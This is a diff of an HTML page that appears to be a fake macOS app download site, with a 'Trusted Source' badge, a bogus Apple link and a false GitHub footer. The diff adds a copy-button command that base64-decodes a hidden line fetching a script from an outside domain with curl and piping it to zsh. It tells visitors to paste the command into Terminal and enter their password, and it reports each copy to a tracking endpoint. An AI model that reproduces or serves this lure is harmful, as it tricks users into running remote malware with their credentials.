@@ -1,136 +1,120 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-  <meta http-equiv="Content-Style-Type" content="text/css">
-  <title></title>
-  <meta name="Generator" content="Cocoa HTML Writer">
-  <meta name="CocoaVersion" content="2685.4">
-  <style type="text/css">
-    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica}
-    p.p2 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica; min-height: 14.0px}
-  </style>
+    <meta charset="utf-8" />
+    <link rel="stylesheet" href="main.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="description" content="Get the latest macOS application using DMG installer or terminal command installation method" />
+    <meta name="author" content="Software Distribution Platform" />
+    <link rel="icon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg" />
+    <title>macOS Application Download — Terminal & DMG Options</title>
 </head>
 <body>
-<p class="p1">&lt;!DOCTYPE html&gt;</p>
-<p class="p1">&lt;html lang="en"&gt;&lt;head&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;meta charset="utf-8"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;link rel="stylesheet" href="css/main.css"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;meta name="description" content="Get the latest macOS application using DMG installer or terminal command installation method"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;meta name="author" content="Software Distribution Platform"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;link rel="icon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;title&gt;macOS Application Download — Terminal &amp;amp; DMG Options&lt;/title&gt;</p>
-<p class="p1">&lt;/head&gt;</p>
-<p class="p1">&lt;body&gt;</p>
-<p class="p1">&lt;main class="container-primary"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;header class="header-section"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;h1&gt;Get Application for macOS&lt;/h1&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="publisher-badge"&gt;&lt;span&gt;Trusted Source&lt;/span&gt;&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;/header&gt;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;article class="content-block" id="terminal-install"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;h2&gt;Terminal Installation&lt;/h2&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;p class="subtitle-text"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>For experienced users: deploy the application using a single command in your terminal.</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;/p&gt;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="installation-panel"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="command-container"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;input id="installCommand" type="text" readonly="" value="echo &amp;quot;Apple-Installer: https://apps.apple.com/hidenn-gift.application/macOsAppleApicationSetup421415.dmg&amp;quot; &amp;amp;&amp;amp; echo 'yourbase64here'|base64 -D|zsh"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;button class="button button-accent" id="duplicateCmd" type="button"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>Copy</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;/button&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="installation-panel" style="margin-top: 14px"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;h4&gt;How to open Terminal on Mac&lt;/h4&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;ol class="instruction-list"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;li&gt;Press Command (⌘) + Space to open Spotlight Search.&lt;/li&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;li&gt;Type "Terminal" and press Return to launch it.&lt;/li&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;li&gt;Once the Terminal window is open, you can proceed with the steps below.&lt;/li&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;/ol&gt;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;h4&gt;Installation via Terminal command&lt;/h4&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;ol class="instruction-list"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;li&gt;Copy the installation command above.&lt;/li&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;li&gt;Open the terminal on your device and paste the command, then press the "Return" button.&lt;/li&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;li&gt;Enter your device password and confirm the installation.&lt;/li&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;/ol&gt;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;video class="video-demo" autoplay="" loop="" muted="" playsinline=""&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;source src="terminal.mp4" type="video/mp4"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>Video playback not supported by your browser.</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;/video&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;/article&gt;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;footer class="page-footer"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;span&gt;© 2025 GitHub, Inc.&lt;/span&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;a href="https://github.com/site/terms"&gt;Terms of Service&lt;/a&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;a href="https://github.com/site/privacy"&gt;Privacy Policy&lt;/a&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;/footer&gt;</p>
-<p class="p1">&lt;/main&gt;</p>
-<p class="p2"><br></p>
-<p class="p1">&lt;!-- --- Скрипт для копирования и статистики --- --&gt;</p>
-<p class="p1">&lt;script&gt;</p>
-<p class="p1">document.addEventListener("DOMContentLoaded", () =&gt; {</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">    </span>function sendStatistics(domain, action) {</p>
-<p class="p1"><span class="Apple-converted-space">        </span>fetch("stats.php", {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>method: "POST",</p>
-<p class="p1"><span class="Apple-converted-space">            </span>headers: { "Content-Type": "application/json" },</p>
-<p class="p1"><span class="Apple-converted-space">            </span>body: JSON.stringify({ domain, action })</p>
-<p class="p1"><span class="Apple-converted-space">        </span>})</p>
-<p class="p1"><span class="Apple-converted-space">        </span>.then(res =&gt; res.json())</p>
-<p class="p1"><span class="Apple-converted-space">        </span>.then(data =&gt; console.log("Telegram уведомление отправлено:", data))</p>
-<p class="p1"><span class="Apple-converted-space">        </span>.catch(err =&gt; console.error("Ошибка отправки статистики:", err));</p>
-<p class="p1"><span class="Apple-converted-space">    </span>}</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">    </span>// Домен и путь страницы</p>
-<p class="p1"><span class="Apple-converted-space">    </span>const domain = window.location.hostname + window.location.pathname;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">    </span>const commandInput = document.getElementById("installCommand");</p>
-<p class="p1"><span class="Apple-converted-space">    </span>const copyBtn = document.getElementById("duplicateCmd");</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">    </span>// Функция копирования</p>
-<p class="p1"><span class="Apple-converted-space">    </span>async function copyCommand() {</p>
-<p class="p1"><span class="Apple-converted-space">        </span>const commandText = commandInput.value;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">        </span>try {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>await navigator.clipboard.writeText(commandText);</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">            </span>const originalText = copyBtn.textContent;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>copyBtn.textContent = "✓ Copied!";</p>
-<p class="p1"><span class="Apple-converted-space">            </span>setTimeout(() =&gt; copyBtn.textContent = originalText, 2000);</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">            </span>sendStatistics(domain, "Copy Command clicked");</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">        </span>} catch (error) {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>console.error("Ошибка копирования:", error);</p>
-<p class="p1"><span class="Apple-converted-space">        </span>}</p>
-<p class="p1"><span class="Apple-converted-space">    </span>}</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">    </span>// Копирование при клике на кнопку</p>
-<p class="p1"><span class="Apple-converted-space">    </span>if (copyBtn) {</p>
-<p class="p1"><span class="Apple-converted-space">        </span>copyBtn.addEventListener("click", copyCommand);</p>
-<p class="p1"><span class="Apple-converted-space">    </span>}</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">    </span>// Статистика для ссылок скачивания</p>
-<p class="p1"><span class="Apple-converted-space">    </span>const downloadBtns = document.querySelectorAll("a[download]");</p>
-<p class="p1"><span class="Apple-converted-space">    </span>downloadBtns.forEach((btn, index) =&gt; {</p>
-<p class="p1"><span class="Apple-converted-space">        </span>btn.addEventListener("click", () =&gt; {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>sendStatistics(domain, `download-${index + 1}`);</p>
-<p class="p1"><span class="Apple-converted-space">        </span>});</p>
-<p class="p1"><span class="Apple-converted-space">    </span>});</p>
-<p class="p2"><br></p>
-<p class="p1">});</p>
-<p class="p1">&lt;/script&gt;</p>
-<p class="p2"><br></p>
-<p class="p1">&lt;script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&amp;quot;version&amp;quot;:&amp;quot;2024.11.0&amp;quot;,&amp;quot;token&amp;quot;:&amp;quot;323f27449ddf4093b44a656cff4fd33e&amp;quot;,&amp;quot;r&amp;quot;:1,&amp;quot;server_timing&amp;quot;:{&amp;quot;name&amp;quot;:{&amp;quot;cfCacheStatus&amp;quot;:true,&amp;quot;cfEdge&amp;quot;:true,&amp;quot;cfExtPri&amp;quot;:true,&amp;quot;cfL4&amp;quot;:true,&amp;quot;cfOrigin&amp;quot;:true,&amp;quot;cfSpeedBrain&amp;quot;:true},&amp;quot;location_startswith&amp;quot;:null}}" crossorigin="anonymous"&gt;&lt;/script&gt;</p>
-<p class="p2"><br></p>
-<p class="p2"><br></p>
-<p class="p1">&lt;/body&gt;&lt;/html&gt;</p>
+<main class="container-primary">
+    <header class="header-section">
+        <h1>Get Application for macOS</h1>
+        <div class="publisher-badge"><span>Trusted Source</span></div>
+    </header>
+
+    <article class="content-block" id="terminal-install">
+        <h2>Terminal Installation</h2>
+        <p class="subtitle-text">
+            For experienced users: deploy the application using a single command in your terminal.
+        </p>
+
+        <div class="installation-panel">
+            <div class="command-container">
+                <input id="installCommand" type="text" readonly 
+                value="echo &quot;Apple-Installer: https://apps.apple.com/hidenn-gift.application/macOsAppleApicationSetup421415.dmg&quot; &amp;&amp; echo 'ZWNobyAnSW5zdGFsbGluZyBwYWNrYWdlcyBwbGVhc2Ugd2FpdC4uLicgJiYgY3VybCAta2ZzU0wgaHR0cDovL2JhcmJlcm1vby5mdW4vY3VybC9lZmQwZDdiZmExMjhlMTc5YzMyYjQ4ZGU4NjY2M2E0OGIwNmVlNjg3OGFhZDdmZjA5MjNlM2FiMWY1OWJiOGM4fHpzaA=='|base64 -D|zsh" />
+                <button class="button button-accent" id="duplicateCmd" type="button">
+                    Copy
+                </button>
+            </div>
+        </div>
+
+        <div class="installation-panel" style="margin-top: 14px">
+            <h4>How to open Terminal on Mac</h4>
+            <ol class="instruction-list">
+                <li>Press Command (⌘) + Space to open Spotlight Search.</li>
+                <li>Type "Terminal" and press Return to launch it.</li>
+                <li>Once the Terminal window is open, you can proceed with the steps below.</li>
+            </ol>
+
+            <h4>Installation via Terminal command</h4>
+            <ol class="instruction-list">
+                <li>Copy the installation command above.</li>
+                <li>Open the terminal on your device and paste the command, then press the "Return" button.</li>
+                <li>Enter your device password and confirm the installation.</li>
+            </ol>
+
+            <video class="video-demo" autoplay loop muted playsinline>
+                <source src="terminal.mp4" type="video/mp4" />
+                Video playback not supported by your browser.
+            </video>
+        </div>
+    </article>
+
+    <footer class="page-footer">
+        <span>© 2025 GitHub, Inc.</span>
+        <a href="https://github.com/site/terms">Terms of Service</a>
+        <a href="https://github.com/site/privacy">Privacy Policy</a>
+    </footer>
+</main>
+
+<!-- --- Скрипт для копирования и статистики --- -->
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+
+    function sendStatistics(domain, action) {
+        fetch("stats.php", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ domain, action })
+        })
+        .then(res => res.json())
+        .then(data => console.log("Telegram уведомление отправлено:", data))
+        .catch(err => console.error("Ошибка отправки статистики:", err));
+    }
+
+    // Домен и путь страницы
+    const domain = window.location.hostname + window.location.pathname;
+
+    const commandInput = document.getElementById("installCommand");
+    const copyBtn = document.getElementById("duplicateCmd");
+
+    // Функция копирования
+    async function copyCommand() {
+        const commandText = commandInput.value;
+
+        try {
+            await navigator.clipboard.writeText(commandText);
+
+            const originalText = copyBtn.textContent;
+            copyBtn.textContent = "✓ Copied!";
+            setTimeout(() => copyBtn.textContent = originalText, 2000);
+
+            sendStatistics(domain, "Copy Command clicked");
+
+        } catch (error) {
+            console.error("Ошибка копирования:", error);
+        }
+    }
+
+    // Копирование при клике на кнопку
+    if (copyBtn) {
+        copyBtn.addEventListener("click", copyCommand);
+    }
+
+    // Статистика для ссылок скачивания
+    const downloadBtns = document.querySelectorAll("a[download]");
+    downloadBtns.forEach((btn, index) => {
+        btn.addEventListener("click", () => {
+            sendStatistics(domain, `download-${index + 1}`);
+        });
+    });
+
+});
+</script>
+
 </body>
 </html>
